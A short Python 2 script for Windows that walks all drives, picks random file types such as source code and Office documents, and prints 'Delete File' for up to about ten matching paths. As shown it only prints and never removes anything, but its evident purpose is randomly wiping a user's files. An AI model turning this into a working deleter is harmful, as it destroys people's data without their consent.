import os
import win32api
import random
from random import randint

#------------------------------------------------------
#   get system path
#------------------------------------------------------
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
filetype = [".m",".py",".c",".cpp",".cs",".doc",".docx",".ppt",".pptx",".xls",".xlsx"]

#------------------------------------------------------
# set delete file number
#------------------------------------------------------
del_num=10

#------------------------------------------------------
#	start
#------------------------------------------------------
while(del_num>0):
	#------------------------------------------------------
	#   random choice drive and filetype
	#------------------------------------------------------
	sl_drive = random.choice(drives)
	sl_ft    = random.choice(filetype)
	print('select drive is   %s  ,select type is   %s  '%(sl_drive,sl_ft))
	for root, dirs, files in os.walk(sl_drive):
		for name in files:
			if name.endswith(sl_ft):
				print ("Delete File: " + os.path.join(root, name))
				print del_num
				del_num=del_num-1
			#--------------------
			# out of the loop
			#--------------------
			if del_num<0:
				break
		if del_num<0:
			break